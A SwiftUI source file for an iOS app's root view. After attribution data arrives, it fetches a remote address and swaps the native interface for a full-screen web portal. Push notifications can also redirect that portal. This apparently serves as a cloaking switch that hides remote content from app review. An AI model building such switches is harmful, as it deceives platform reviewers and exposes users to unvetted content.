import SwiftUI

struct AppRootView: View {
    @StateObject private var store = AppDataStore()

    @AppStorage("displayMode") private var displayMode: String = "unknown"
    @AppStorage("lastNotificationRequest") private var lastNotificationRequest: Double = 0

    @State private var showNotificationRequest = false
    @State private var isLoading = true
    @State private var showContent = false
    @State private var contentDestination: String = ""
    @State private var pushDestination: String? = nil

    var body: some View {
        ZStack {
            if isLoading {
                SplashScreen()
            } else {
                if showContent {
                    PortalView(address: pushDestination ?? contentDestination)
                        .background(Color.black.ignoresSafeArea())
                } else {
                    MainTabView()
                        .environmentObject(store)
                        .preferredColorScheme(.dark)
                }
            }
        }
        .fullScreenCover(isPresented: $showNotificationRequest) {
            NotificationRequestView() {
                showNotificationRequest = false
                activate()
            }
        }
        .onAppear(perform: handleAppLaunch)
        .onReceive(NotificationCenter.default.publisher(for: NSNotification.Name("PushURLReceived"))) { notification in
            if let dest = notification.object as? String {
                self.pushDestination = dest
                self.showContent = true
            }
        }
    }

    private func handleAppLaunch() {
        if displayMode == "native" {
            deactivate()
        } else {
            waitForAppsFlyer()
        }
    }

    private func waitForAppsFlyer() {
        Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { timer in
            if UserDefaults.standard.bool(forKey: "recieved") {
                timer.invalidate()
                resolve()
            }
        }
    }

    private func resolve() {
        Task {
            let destination = await ConfigManager.shared.fetchDestination()

            if let dest = destination, !dest.isEmpty {
                self.contentDestination = dest
                self.displayMode = "remote"
                checkNotificationStatus()
            } else {
                self.displayMode = "native"
                deactivate()
            }
        }
    }

    private var isReadyForNotificationRequest: Bool {
        let now = Date().timeIntervalSince1970
        return (now - lastNotificationRequest) >= 259200
    }

    private func checkNotificationStatus() {
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            DispatchQueue.main.async {
                if settings.authorizationStatus == .notDetermined && isReadyForNotificationRequest {
                    self.showNotificationRequest = true
                } else {
                    activate()
                }
            }
        }
    }

    private func activate() {
        self.showContent = true
        self.isLoading = false
    }

    private func deactivate() {
        self.showContent = false
        self.isLoading = false
    }
}

private struct SplashScreen: View {
    @State private var progress: CGFloat = 0

    var body: some View {
        ZStack {
            Color(red: 0x0F/255, green: 0x13/255, blue: 0x20/255)
            .ignoresSafeArea()

            VStack(spacing: 32) {
                Spacer()

                if let icon = UIImage(named: "icon") {
                    Image(uiImage: icon)
                        .resizable()
                        .frame(width: 110, height: 110)
                        .clipShape(RoundedRectangle(cornerRadius: 24, style: .continuous))
                        .shadow(color: .black.opacity(0.4), radius: 16, x: 0, y: 8)
                }

                GeometryReader { geo in
                    ZStack(alignment: .leading) {
                        Capsule()
                            .fill(Color.white.opacity(0.2))
                            .frame(height: 4)
                        Capsule()
                            .fill(Color.white)
                            .frame(width: geo.size.width * progress, height: 4)
                    }
                }
                .frame(width: 160, height: 4)

                Spacer()
            }
        }
        .onAppear {
            withAnimation(.easeInOut(duration: 1.8).repeatForever(autoreverses: true)) {
                progress = 1.0
            }
        }
    }
}
